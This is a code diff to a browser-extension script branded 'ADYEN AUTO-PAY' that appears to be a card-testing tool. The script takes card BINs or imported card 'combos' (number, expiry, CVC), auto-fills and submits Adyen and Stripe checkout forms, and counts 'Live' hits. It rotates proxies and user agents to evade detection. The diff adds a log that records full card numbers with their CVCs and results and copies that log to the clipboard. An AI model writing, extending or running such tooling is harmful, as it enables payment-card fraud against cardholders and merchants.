@@ -22,6 +22,37 @@
   let cardSourceMode = null;
   const combosKey = "adyenCombos";
   let comboListEl = null;
+  let logBuffer = [];
+
+  function pushLog(text) {
+    const line = "[" + new Date().toTimeString().slice(0, 8) + "] " + text;
+    logBuffer.push(line);
+    if (logBuffer.length > 1000) logBuffer.splice(0, logBuffer.length - 1000);
+  }
+
+  function fallbackCopy(text) {
+    try {
+      const ta = document.createElement("textarea");
+      ta.value = text;
+      ta.style.position = "fixed";
+      ta.style.opacity = "0";
+      document.body.appendChild(ta);
+      ta.select();
+      document.execCommand("copy");
+      document.body.removeChild(ta);
+    } catch (e) {}
+  }
+
+  function copyLog() {
+    const text = logBuffer.join("\n");
+    const ok = () => window.__nonoLog && window.__nonoLog("Log copied (" + logBuffer.length + " lines). Paste it back to me.");
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+      navigator.clipboard.writeText(text).then(ok).catch(() => { fallbackCopy(text); ok(); });
+    } else {
+      fallbackCopy(text);
+      ok();
+    }
+  }
 
   function saveCombos() {
     try {
@@ -516,6 +547,20 @@
     const mc = document.getElementById("nono-mode-combo");
     if (mb) { mb.style.background = isBin ? "#00d1b2" : "#23303c"; mb.style.color = isBin ? "#00110d" : "#e6e6e6"; mb.style.fontWeight = isBin ? "800" : "700"; }
     if (mc) { mc.style.background = isBin ? "#23303c" : "#00d1b2"; mc.style.color = isBin ? "#e6e6e6" : "#00110d"; mc.style.fontWeight = isBin ? "700" : "800"; }
+  }
+
+  function paymentRelevant() {
+    const u = location.href;
+    if (/checkoutshopper|\.adyen\.(com|link)|(^|[./])(buy|checkout|pay|js)\.stripe\.com|stripe\.network/i.test(u)) return true;
+    try {
+      return !!document.querySelector("iframe[src*='stripe.com'], iframe[src*='adyen.com'], input[data-elements-stable-field-name], input[autocomplete='cc-number'], input[autocomplete='cc-exp'], select[name*='country']");
+    } catch (e) {
+      return false;
+    }
+  }
+
+  function panelActive() {
+    return !!document.getElementById("nono-panel");
   }
 
   function setNativeValue(el, value) {
@@ -1144,151 +1189,33 @@
     ].join(";");
 
     panel.innerHTML = `
-      <div style="background:linear-gradient(135deg,#00d1b2,#00a88c);color:#00110d;padding:10px 12px;display:flex;justify-content:space-between;align-items:center">
+      <div style="background:linear-gradient(135deg,#00d1b2,#00a88c);color:#00110d;padding:8px 12px;display:flex;justify-content:space-between;align-items:center">
         <div style="display:flex;align-items:center;gap:8px">
           <span style="font-size:16px">&#9889;</span>
           <b style="font-size:13px;letter-spacing:.5px">ADYEN AUTO-PAY</b>
-          <span id="nono-ver" style="font-size:9px;background:#00110d33;color:#00110d;padding:2px 6px;border-radius:8px">1.12.4</span>
+          <span id="nono-ver" style="font-size:9px;background:#00110d33;color:#00110d;padding:2px 6px;border-radius:8px">1.12.5</span>
         </div>
-        <div style="display:flex;gap:6px">
+        <div style="display:flex;gap:4px;align-items:center">
+          <button id="nono-copy-log" title="Copy activity log to clipboard" style="background:#00110d22;border:none;color:#00110d;cursor:pointer;padding:3px 6px;border-radius:6px;font-size:9px;line-height:1;font-weight:800">&#10697; LOG</button>
           <button id="nono-dbg" title="Debug DOM" style="background:#00110d22;border:none;color:#00110d;cursor:pointer;width:22px;height:22px;border-radius:6px;font-size:10px;line-height:1;font-weight:700">DBG</button>
+          <button id="nono-settings" title="Settings" style="background:#00110d22;border:none;color:#00110d;cursor:pointer;width:24px;height:22px;border-radius:6px;font-size:13px;line-height:1">&#9881;</button>
           <button id="nono-min" title="Minimize" style="background:#00110d22;border:none;color:#00110d;cursor:pointer;width:22px;height:22px;border-radius:6px;font-size:12px;line-height:1">&#8211;</button>
         </div>
       </div>
 
       <div style="padding:12px;display:flex;flex-direction:column;gap:6px;overflow-y:auto;flex:1 1 auto;min-height:0">
-        <div style="display:flex;gap:4px;margin-bottom:2px">
-          <button id="nono-mode-bin" type="button" style="flex:1;padding:7px;background:#00d1b2;color:#00110d;border:none;border-radius:7px;font-size:11px;font-weight:800;cursor:pointer">BIN</button>
-          <button id="nono-mode-combo" type="button" style="flex:1;padding:7px;background:#23303c;color:#e6e6e6;border:none;border-radius:7px;font-size:11px;font-weight:700;cursor:pointer">COMBO</button>
-        </div>
         <div id="nono-bin-wrap" style="display:flex;gap:6px">
           <div style="flex:1">
-            <label style="font-size:9px;text-transform:uppercase;color:#6b7b8d">Custom BIN</label>
-            <input id="nono-bin" type="text" placeholder="4400661989645" maxlength="19" inputmode="numeric"
-              style="width:100%;box-sizing:border-box;padding:8px;background:#131a22;color:#e6e6e6;border:1px solid #23303c;border-radius:8px;font-size:13px;outline:none">
-          </div>
-          <div style="width:88px;flex-shrink:0">
-            <label style="font-size:9px;text-transform:uppercase;color:#6b7b8d">Card Len</label>
-            <select id="nono-len" style="width:100%;padding:8px;background:#131a22;color:#e6e6e6;border:1px solid #23303c;border-radius:8px;font-size:12px;outline:none">
-              <option value="0">Auto</option>
-              <option value="16">16</option>
-              <option value="15">15</option>
-              <option value="19">19</option>
-            </select>
+            <label style="font-size:9px;text-transform:uppercase;color:#6b7b8d">BIN</label>
+            <input id="nono-bin" type="text" placeholder="4400661989645" maxlength="19" inputmode="numeric" autofocus
+              style="width:100%;box-sizing:border-box;padding:9px;background:#131a22;color:#e6e6e6;border:1px solid #00d1b2;border-radius:8px;font-size:15px;outline:none;font-weight:700;letter-spacing:1px">
           </div>
         </div>
         <div id="nono-bin-spec" style="font-size:10px;color:#6b7b8d;min-height:14px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">type a BIN to auto-detect brand/length/CVC</div>
 
-        <div id="nono-combo-wrap" style="display:flex;gap:6px;align-items:flex-end">
-          <div style="flex:1">
-            <label style="font-size:9px;text-transform:uppercase;color:#6b7b8d">Full Combo</label>
-            <input id="nono-combo" type="text" placeholder="number|mm|yyyy|cvc|zip" inputmode="numeric"
-              style="width:100%;box-sizing:border-box;padding:8px;background:#131a22;color:#e6e6e6;border:1px solid #23303c;border-radius:8px;font-size:13px;outline:none">
-          </div>
-          <div style="width:88px">
-            <label style="font-size:9px;text-transform:uppercase;color:#6b7b8d">Holder</label>
-            <input id="nono-holder" type="text" placeholder="JOHN DOE" style="width:100%;box-sizing:border-box;padding:8px;background:#131a22;color:#e6e6e6;border:1px solid #23303c;border-radius:8px;font-size:12px;outline:none">
-          </div>
-        </div>
-
-        <div id="nono-addr-wrap" style="display:flex;gap:6px">
-          <div style="width:64px">
-            <label style="font-size:9px;text-transform:uppercase;color:#6b7b8d">Country</label>
-            <input id="nono-country" type="text" placeholder="US" maxlength="2" autocomplete="country-name"
-              style="width:100%;box-sizing:border-box;padding:8px;background:#131a22;color:#e6e6e6;border:1px solid #23303c;border-radius:8px;font-size:13px;outline:none;text-transform:uppercase">
-          </div>
-          <div style="flex:1">
-            <label style="font-size:9px;text-transform:uppercase;color:#6b7b8d">Zip</label>
-            <input id="nono-postal" type="text" placeholder="auto by country" autocomplete="postal-code"
-              style="width:100%;box-sizing:border-box;padding:8px;background:#131a22;color:#e6e6e6;border:1px solid #23303c;border-radius:8px;font-size:13px;outline:none">
-          </div>
-          <div style="width:88px">
-            <label style="font-size:9px;text-transform:uppercase;color:#6b7b8d">Email</label>
-            <input id="nono-email" type="email" placeholder="auto" style="width:100%;box-sizing:border-box;padding:8px;background:#131a22;color:#e6e6e6;border:1px solid #23303c;border-radius:8px;font-size:12px;outline:none">
-          </div>
-        </div>
-
-        <div style="display:flex;gap:6px;align-items:center;font-size:11px;margin-top:2px">
-          <label style="display:flex;align-items:center;gap:4px;color:#8fa3b5;cursor:pointer">
-            <input type="checkbox" id="nono-autosubmit" style="width:auto;accent-color:#00d1b2"> Auto Submit
-          </label>
-          <label style="display:flex;align-items:center;gap:4px;color:#8fa3b5;cursor:pointer">
-            <input type="checkbox" id="nono-autoonload" style="width:auto;accent-color:#00d1b2"> Auto on Load
-          </label>
-        </div>
-
-        <div style="margin-top:8px;border-top:1px solid #1a2430;padding-top:8px">
-          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px">
-            <label style="font-size:9px;text-transform:uppercase;color:#6b7b8d">Combo File Import</label>
-            <span id="nono-combo-count" style="font-size:9px;color:#00d1b2">0 combos</span>
-          </div>
-          <div style="display:flex;gap:6px">
-            <label id="nono-upload-btn" style="flex:1;padding:8px;background:#23303c;color:#e6e6e6;border:none;border-radius:8px;font-size:11px;cursor:pointer;text-align:center;font-weight:600">
-              📁 Upload Combo File
-            </label>
-            <input type="file" id="nono-file-input" accept=".txt,.csv" style="display:none">
-            <button id="nono-clear-combos" style="padding:8px;background:#23303c;color:#e6e6e6;border:none;border-radius:8px;font-size:11px;cursor:pointer;font-weight:600">Clear</button>
-          </div>
-          <div id="nono-combo-list" style="max-height:80px;overflow-y:auto;font-size:10px;margin-top:6px;border:1px solid #1a2430;border-radius:6px;background:#0a0d12;display:none">
-          </div>
-          <div style="font-size:9px;color:#46566a;margin-top:4px">Format: cardnumber|mm|yyyy|cvc (one per line)</div>
-        </div>
-
-        <div style="display:flex;gap:6px;margin-top:4px">
-          <button id="nono-start" style="flex:2;padding:11px;background:linear-gradient(135deg,#00d1b2,#00a88c);color:#00110d;border:none;border-radius:9px;font-weight:700;font-size:13px;cursor:pointer">&#9654; START HIT</button>
-          <button id="nono-stop" style="flex:1;padding:11px;background:#23303c;color:#e6e6e6;border:none;border-radius:9px;font-weight:600;font-size:12px;cursor:pointer">STOP</button>
-        </div>
-
-        <div id="nono-proxy-row" style="display:flex;gap:6px;align-items:center;margin-top:4px">
-          <span id="nono-proxy-label" style="flex:1;font-size:10px;color:#8fa3b5;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">Proxy: OFF</span>
-          <button id="nono-proxy-next" style="padding:6px 8px;background:#23303c;color:#e6e6e6;border:none;border-radius:7px;font-size:10px;font-weight:700;cursor:pointer">NEXT</button>
-          <button id="nono-proxy-test" style="padding:6px 8px;background:#23303c;color:#e6e6e6;border:none;border-radius:7px;font-size:10px;font-weight:700;cursor:pointer">TEST</button>
-          <button id="nono-proxy-off" style="padding:6px 8px;background:#3a2230;color:#ff7d7d;border:none;border-radius:7px;font-size:10px;font-weight:700;cursor:pointer">OFF</button>
-        </div>
-
-        <div id="nono-ua-row" style="display:flex;gap:6px;align-items:center;margin-top:4px">
-          <span id="nono-ua-label" style="flex:1;font-size:10px;color:#8fa3b5;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">UA: OFF</span>
-          <button id="nono-ua-next" style="padding:6px 8px;background:#23303c;color:#e6e6e6;border:none;border-radius:7px;font-size:10px;font-weight:700;cursor:pointer">NEXT</button>
-          <button id="nono-ua-toggle" style="padding:6px 8px;background:#23303c;color:#ffd166;border:none;border-radius:7px;font-size:10px;font-weight:700;cursor:pointer">ON/OFF</button>
-        </div>
-
-        <div id="nono-cs" style="display:flex;flex-direction:column;gap:6px;margin-top:4px">
-          <label style="font-size:9px;text-transform:uppercase;color:#6b7b8d">Checkoutshopper URL / session</label>
-          <textarea id="nono-cs-url" rows="3" spellcheck="false"
-            placeholder="https://checkoutshopper-test.adyen.com/checkoutshopper/v1/sessions/{id}/setup?clientKey=test_...&#10;or paste the full curl with --data-raw {sessionData}"
-            style="width:100%;box-sizing:border-box;padding:8px;background:#131a22;color:#e6e6e6;border:1px solid #23303c;border-radius:8px;font-size:11px;outline:none;resize:vertical;font-family:monospace"></textarea>
-          <div style="display:flex;gap:6px;align-items:center">
-            <button id="nono-cs-pay" style="flex:1;padding:10px;background:linear-gradient(135deg,#2f8cff,#1b5fd8);color:#fff;border:none;border-radius:9px;font-weight:700;font-size:12px;cursor:pointer">&#9654; OPEN &amp; PAY</button>
-            <span id="nono-cs-status" style="font-size:10px;color:#8fa3b5">sandbox only</span>
-          </div>
-
-          <div style="display:flex;flex-direction:column;gap:6px;margin-top:4px;padding:8px;background:#0d141c;border:1px solid #1a2632;border-radius:9px">
-            <div style="display:flex;gap:6px;align-items:center">
-              <button id="nono-inbuilt-pay" style="flex:1;padding:9px;background:linear-gradient(135deg,#9b59b6,#6c3483);color:#fff;border:none;border-radius:8px;font-weight:700;font-size:11px;cursor:pointer">&#9678; EXTRACT INBUILT + PAY</button>
-              <button id="nono-inbuilt-clear" title="Clear captured inbuilt session" style="padding:9px 10px;background:#3a2230;color:#ff7d7d;border:none;border-radius:8px;font-size:11px;font-weight:700;cursor:pointer">X</button>
-            </div>
-            <div style="display:flex;justify-content:space-between;align-items:center;gap:6px">
-              <span id="nono-inbuilt-status" style="font-size:10px;color:#8fa3b5;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">waiting for embedded Adyen session…</span>
-              <label style="display:flex;align-items:center;gap:4px;color:#8fa3b5;cursor:pointer;font-size:10px;flex-shrink:0">
-                <input type="checkbox" id="nono-autoinbuilt" style="width:auto;accent-color:#9b59b6"> Auto</label>
-            </div>
-          </div>
-
-          <div style="display:flex;flex-direction:column;gap:6px;margin-top:4px;padding:8px;background:#0d1117;border:1px solid #2d3350;border-radius:9px">
-            <div style="display:flex;align-items:center;gap:6px">
-              <span style="font-size:11px;font-weight:800;color:#635bff;letter-spacing:.5px">STRIPE</span>
-              <label style="display:flex;align-items:center;gap:4px;color:#8fa3b5;cursor:pointer;font-size:10px">
-                <input type="checkbox" id="nono-autostripe" style="width:auto;accent-color:#635bff"> Auto</label>
-              <span id="nono-stripe-status" style="flex:1;font-size:10px;color:#8fa3b5;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">link / inbuilt mode</span>
-            </div>
-            <input id="nono-stripe-url" type="text" placeholder="https://buy.stripe.com/... (hosted payment link)"
-              style="width:100%;box-sizing:border-box;padding:8px;background:#131a22;color:#e6e6e6;border:1px solid #23303c;border-radius:8px;font-size:11px;outline:none">
-            <div style="display:flex;gap:6px;align-items:center">
-              <input id="nono-email" type="text" placeholder="email (empty = random)"
-                style="flex:1;width:auto;box-sizing:border-box;padding:8px;background:#131a22;color:#e6e6e6;border:1px solid #23303c;border-radius:8px;font-size:11px;outline:none">
-              <button id="nono-stripe-open" style="padding:8px 10px;background:linear-gradient(135deg,#635bff,#4f46e5);color:#fff;border:none;border-radius:8px;font-size:10px;font-weight:700;cursor:pointer">OPEN + HIT</button>
-            </div>
-          </div>
+        <div style="display:flex;gap:6px;margin-top:2px">
+          <button id="nono-start" style="flex:2;padding:12px;background:linear-gradient(135deg,#00d1b2,#00a88c);color:#00110d;border:none;border-radius:9px;font-weight:800;font-size:14px;cursor:pointer">&#9654; START</button>
+          <button id="nono-stop" style="flex:1;padding:12px;background:#23303c;color:#ff6b6b;border:none;border-radius:9px;font-weight:800;font-size:14px;cursor:pointer">STOP</button>
         </div>
 
         <div style="display:flex;justify-content:space-between;font-size:11px;margin-top:2px">
@@ -1296,10 +1223,131 @@
           <span style="color:#ffcc00" id="nono-count">Live: 0</span>
         </div>
 
-        <div id="nono-results" style="max-height:150px;overflow-y:auto;font-size:11px;border-top:1px solid #1a2430;padding-top:6px"></div>
+        <div id="nono-results" style="max-height:180px;overflow-y:auto;font-size:11px;border-top:1px solid #1a2430;padding-top:6px"></div>
 
-        <div style="display:flex;justify-content:flex-end">
-          <button id="nono-close" style="background:none;border:none;color:#5a6b7c;cursor:pointer;font-size:11px;padding:2px 6px;border-radius:6px">Remove</button>
+        <div id="nono-advanced" style="display:none;flex-direction:column;gap:6px;border-top:1px solid #1a2430;margin-top:4px;padding-top:8px">
+          <div style="display:flex;gap:4px;margin-bottom:2px">
+            <button id="nono-mode-bin" type="button" style="flex:1;padding:7px;background:#00d1b2;color:#00110d;border:none;border-radius:7px;font-size:11px;font-weight:800;cursor:pointer">BIN</button>
+            <button id="nono-mode-combo" type="button" style="flex:1;padding:7px;background:#23303c;color:#e6e6e6;border:none;border-radius:7px;font-size:11px;font-weight:700;cursor:pointer">COMBO</button>
+          </div>
+          <div id="nono-combo-wrap" style="display:flex;gap:6px;align-items:flex-end">
+            <div style="flex:1">
+              <label style="font-size:9px;text-transform:uppercase;color:#6b7b8d">Full Combo</label>
+              <input id="nono-combo" type="text" placeholder="number|mm|yyyy|cvc|zip" inputmode="numeric"
+                style="width:100%;box-sizing:border-box;padding:8px;background:#131a22;color:#e6e6e6;border:1px solid #23303c;border-radius:8px;font-size:13px;outline:none">
+            </div>
+            <div style="width:88px">
+              <label style="font-size:9px;text-transform:uppercase;color:#6b7b8d">Card Len</label>
+              <select id="nono-len" style="width:100%;padding:8px;background:#131a22;color:#e6e6e6;border:1px solid #23303c;border-radius:8px;font-size:12px;outline:none">
+                <option value="0">Auto</option>
+                <option value="16">16</option>
+                <option value="15">15</option>
+                <option value="19">19</option>
+              </select>
+            </div>
+          </div>
+          <div style="display:flex;gap:6px;align-items:flex-end">
+            <div style="flex:1">
+              <label style="font-size:9px;text-transform:uppercase;color:#6b7b8d">Holder</label>
+              <input id="nono-holder" type="text" placeholder="JOHN DOE" style="width:100%;box-sizing:border-box;padding:8px;background:#131a22;color:#e6e6e6;border:1px solid #23303c;border-radius:8px;font-size:12px;outline:none">
+            </div>
+            <div style="flex:1">
+              <label style="font-size:9px;text-transform:uppercase;color:#6b7b8d">Email</label>
+              <input id="nono-email" type="email" placeholder="auto" style="width:100%;box-sizing:border-box;padding:8px;background:#131a22;color:#e6e6e6;border:1px solid #23303c;border-radius:8px;font-size:12px;outline:none">
+            </div>
+          </div>
+          <div id="nono-addr-wrap" style="display:flex;gap:6px">
+            <div style="width:64px">
+              <label style="font-size:9px;text-transform:uppercase;color:#6b7b8d">Country</label>
+              <input id="nono-country" type="text" placeholder="US" maxlength="2" autocomplete="country-name"
+                style="width:100%;box-sizing:border-box;padding:8px;background:#131a22;color:#e6e6e6;border:1px solid #23303c;border-radius:8px;font-size:13px;outline:none;text-transform:uppercase">
+            </div>
+            <div style="flex:1">
+              <label style="font-size:9px;text-transform:uppercase;color:#6b7b8d">Zip</label>
+              <input id="nono-postal" type="text" placeholder="auto by country" autocomplete="postal-code"
+                style="width:100%;box-sizing:border-box;padding:8px;background:#131a22;color:#e6e6e6;border:1px solid #23303c;border-radius:8px;font-size:13px;outline:none">
+            </div>
+          </div>
+
+          <div style="display:flex;gap:6px;align-items:center;font-size:11px;margin-top:2px">
+            <label style="display:flex;align-items:center;gap:4px;color:#8fa3b5;cursor:pointer">
+              <input type="checkbox" id="nono-autosubmit" style="width:auto;accent-color:#00d1b2"> Auto Submit
+            </label>
+            <label style="display:flex;align-items:center;gap:4px;color:#8fa3b5;cursor:pointer">
+              <input type="checkbox" id="nono-autoonload" style="width:auto;accent-color:#00d1b2"> Auto on Load
+            </label>
+          </div>
+
+          <div style="margin-top:8px;border-top:1px solid #1a2430;padding-top:8px">
+            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px">
+              <label style="font-size:9px;text-transform:uppercase;color:#6b7b8d">Combo File Import</label>
+              <span id="nono-combo-count" style="font-size:9px;color:#00d1b2">0 combos</span>
+            </div>
+            <div style="display:flex;gap:6px">
+              <label id="nono-upload-btn" style="flex:1;padding:8px;background:#23303c;color:#e6e6e6;border:none;border-radius:8px;font-size:11px;cursor:pointer;text-align:center;font-weight:600">
+                📁 Upload Combo File
+              </label>
+              <input type="file" id="nono-file-input" accept=".txt,.csv" style="display:none">
+              <button id="nono-clear-combos" style="padding:8px;background:#23303c;color:#e6e6e6;border:none;border-radius:8px;font-size:11px;cursor:pointer;font-weight:600">Clear</button>
+            </div>
+            <div id="nono-combo-list" style="max-height:80px;overflow-y:auto;font-size:10px;margin-top:6px;border:1px solid #1a2430;border-radius:6px;background:#0a0d12;display:none">
+            </div>
+            <div style="font-size:9px;color:#46566a;margin-top:4px">Format: cardnumber|mm|yyyy|cvc (one per line)</div>
+          </div>
+
+          <div id="nono-proxy-row" style="display:flex;gap:6px;align-items:center;margin-top:4px">
+            <span id="nono-proxy-label" style="flex:1;font-size:10px;color:#8fa3b5;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">Proxy: OFF</span>
+            <button id="nono-proxy-next" style="padding:6px 8px;background:#23303c;color:#e6e6e6;border:none;border-radius:7px;font-size:10px;font-weight:700;cursor:pointer">NEXT</button>
+            <button id="nono-proxy-test" style="padding:6px 8px;background:#23303c;color:#e6e6e6;border:none;border-radius:7px;font-size:10px;font-weight:700;cursor:pointer">TEST</button>
+            <button id="nono-proxy-off" style="padding:6px 8px;background:#3a2230;color:#ff7d7d;border:none;border-radius:7px;font-size:10px;font-weight:700;cursor:pointer">OFF</button>
+          </div>
+
+          <div id="nono-ua-row" style="display:flex;gap:6px;align-items:center;margin-top:4px">
+            <span id="nono-ua-label" style="flex:1;font-size:10px;color:#8fa3b5;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">UA: OFF</span>
+            <button id="nono-ua-next" style="padding:6px 8px;background:#23303c;color:#e6e6e6;border:none;border-radius:7px;font-size:10px;font-weight:700;cursor:pointer">NEXT</button>
+            <button id="nono-ua-toggle" style="padding:6px 8px;background:#23303c;color:#ffd166;border:none;border-radius:7px;font-size:10px;font-weight:700;cursor:pointer">ON/OFF</button>
+          </div>
+
+          <div id="nono-cs" style="display:flex;flex-direction:column;gap:6px;margin-top:4px">
+            <label style="font-size:9px;text-transform:uppercase;color:#6b7b8d">Checkoutshopper URL / session</label>
+            <textarea id="nono-cs-url" rows="3" spellcheck="false"
+              placeholder="https://checkoutshopper-test.adyen.com/checkoutshopper/v1/sessions/{id}/setup?clientKey=test_...&#10;or paste the full curl with --data-raw {sessionData}"
+              style="width:100%;box-sizing:border-box;padding:8px;background:#131a22;color:#e6e6e6;border:1px solid #23303c;border-radius:8px;font-size:11px;outline:none;resize:vertical;font-family:monospace"></textarea>
+            <div style="display:flex;gap:6px;align-items:center">
+              <button id="nono-cs-pay" style="flex:1;padding:10px;background:linear-gradient(135deg,#2f8cff,#1b5fd8);color:#fff;border:none;border-radius:9px;font-weight:700;font-size:12px;cursor:pointer">&#9654; OPEN &amp; PAY</button>
+              <span id="nono-cs-status" style="font-size:10px;color:#8fa3b5">sandbox only</span>
+            </div>
+
+            <div style="display:flex;flex-direction:column;gap:6px;margin-top:4px;padding:8px;background:#0d141c;border:1px solid #1a2632;border-radius:9px">
+              <div style="display:flex;gap:6px;align-items:center">
+                <button id="nono-inbuilt-pay" style="flex:1;padding:9px;background:linear-gradient(135deg,#9b59b6,#6c3483);color:#fff;border:none;border-radius:8px;font-weight:700;font-size:11px;cursor:pointer">&#9678; EXTRACT INBUILT + PAY</button>
+                <button id="nono-inbuilt-clear" title="Clear captured inbuilt session" style="padding:9px 10px;background:#3a2230;color:#ff7d7d;border:none;border-radius:8px;font-size:11px;font-weight:700;cursor:pointer">X</button>
+              </div>
+              <div style="display:flex;justify-content:space-between;align-items:center;gap:6px">
+                <span id="nono-inbuilt-status" style="font-size:10px;color:#8fa3b5;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">waiting for embedded Adyen session…</span>
+                <label style="display:flex;align-items:center;gap:4px;color:#8fa3b5;cursor:pointer;font-size:10px;flex-shrink:0">
+                  <input type="checkbox" id="nono-autoinbuilt" style="width:auto;accent-color:#9b59b6"> Auto</label>
+              </div>
+            </div>
+
+            <div style="display:flex;flex-direction:column;gap:6px;margin-top:4px;padding:8px;background:#0d1117;border:1px solid #2d3350;border-radius:9px">
+              <div style="display:flex;align-items:center;gap:6px">
+                <span style="font-size:11px;font-weight:800;color:#635bff;letter-spacing:.5px">STRIPE</span>
+                <label style="display:flex;align-items:center;gap:4px;color:#8fa3b5;cursor:pointer;font-size:10px">
+                  <input type="checkbox" id="nono-autostripe" style="width:auto;accent-color:#635bff"> Auto</label>
+                <span id="nono-stripe-status" style="flex:1;font-size:10px;color:#8fa3b5;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">link / inbuilt mode</span>
+              </div>
+              <input id="nono-stripe-url" type="text" placeholder="https://buy.stripe.com/... (hosted payment link)"
+                style="width:100%;box-sizing:border-box;padding:8px;background:#131a22;color:#e6e6e6;border:1px solid #23303c;border-radius:8px;font-size:11px;outline:none">
+              <div style="display:flex;gap:6px;align-items:center">
+                <button id="nono-stripe-open" style="flex:1;padding:8px 10px;background:linear-gradient(135deg,#635bff,#4f46e5);color:#fff;border:none;border-radius:8px;font-size:10px;font-weight:700;cursor:pointer">OPEN + HIT</button>
+              </div>
+            </div>
+          </div>
+
+          <div style="display:flex;justify-content:flex-end;margin-top:2px">
+            <button id="nono-close" style="background:none;border:none;color:#5a6b7c;cursor:pointer;font-size:11px;padding:2px 6px;border-radius:6px">Remove</button>
+          </div>
         </div>
       </div>
     `;
@@ -1393,12 +1441,13 @@
       return cfg;
     }
 
-    function logMsg(m) { log.textContent = m; }
+    function logMsg(m) { log.textContent = m; pushLog(m); }
     function updateCount() {
       count.textContent = "Live: " + liveHits + " / " + tries;
       pillCount.textContent = String(liveHits);
     }
     function logResult(icon, text, color, mono) {
+      pushLog(text);
       const line = document.createElement("div");
       line.style.cssText = "padding:3px 0;border-bottom:1px solid #141c26;color:" + (mono ? "#e6e6e6" : color) + ";white-space:nowrap;overflow:hidden;text-overflow:ellipsis;display:flex;gap:4px;align-items:center";
       line.innerHTML = '<span style="flex-shrink:0">' + icon + '</span><span style="overflow:hidden;text-overflow:ellipsis">' + text + '</span>';
@@ -1432,6 +1481,18 @@
 
     el("#nono-min").addEventListener("click", minimize);
     el("#nono-dbg").addEventListener("click", debugDump);
+    el("#nono-settings").addEventListener("click", () => {
+      const adv = panel.querySelector("#nono-advanced");
+      const open = adv.style.display === "none";
+      adv.style.display = open ? "flex" : "none";
+      chrome.storage.local.set({ nonoAdvOpen: open });
+      logMsg(open ? "Settings open." : "Settings closed.");
+    });
+    el("#nono-copy-log").addEventListener("click", copyLog);
+    chrome.storage.local.get("nonoAdvOpen", (res) => {
+      const adv = panel.querySelector("#nono-advanced");
+      if (res && res.nonoAdvOpen) adv.style.display = "flex";
+    });
     el("#nono-close").addEventListener("click", () => {
       panel.style.opacity = "0";
       setTimeout(() => panel.remove(), 200);
@@ -1744,7 +1805,10 @@
           window.__nonoResult && window.__nonoResult("&#128269;",
             "RESP " + (info.resultCode || info.action || "?") +
             (info.refusalReason ? " | " + info.refusalReason : ""), "#c9b8ff");
+          pushLog("RESP adyen " + status + " " + String((info.resultCode || info.action) + (info.refusalReason ? " " + info.refusalReason : "")).trim());
         }
+
+        pushLog("CARD " + card.number + " " + (card.month || "??") + "/" + (card.year || "????") + " cvc " + (card.cvc || "?") + (card.zip ? " zip " + card.zip : "") + " -> " + res.label + (res.ok ? " [LIVE]" : ""));
 
         if (res.ok) {
           liveHits++;
@@ -1825,6 +1889,7 @@
     }
 
     async function inbuiltAutoScan(force) {
+      if (!panelActive()) return;
       if (csRunning || running) return;
       const cfg = await getConfig();
       if (!force && !(cfg && cfg.autoInbuilt)) return;
@@ -1882,6 +1947,7 @@
     }
 
     async function stripeAutoScan(force) {
+      if (!panelActive()) return;
       if (running || csRunning) return;
       const cfg = await getConfig();
       if (!force && !(cfg && cfg.autoStripe)) return;
@@ -2179,6 +2245,12 @@
         else res = { ok: false, label: "NO VISIBLE RESULT" };
       }
 
+      pushLog("CARD " + card.number + " " + (card.month || "??") + "/" + (card.year || "????") + " cvc " + (card.cvc || "?") + (card.zip ? " zip " + card.zip : "") + " -> " + res.label + (res.ok ? " [LIVE]" : ""));
+      if (resp && resp.body) {
+        const body = String(resp.body);
+        if (body.length > 4) pushLog("RESP " + (respProvider || "?") + " " + (resp.status || "") + " " + body.slice(0, 600));
+      }
+
       window.__nonoUpdate && window.__nonoUpdate();
 
       const respTail = respInfo
@@ -2242,6 +2314,7 @@
 
   async function init() {
     if (!isTop) return;
+    if (!paymentRelevant()) return;
     hostOk = true;
     removeBlockedNotice();
     await loadCombos();
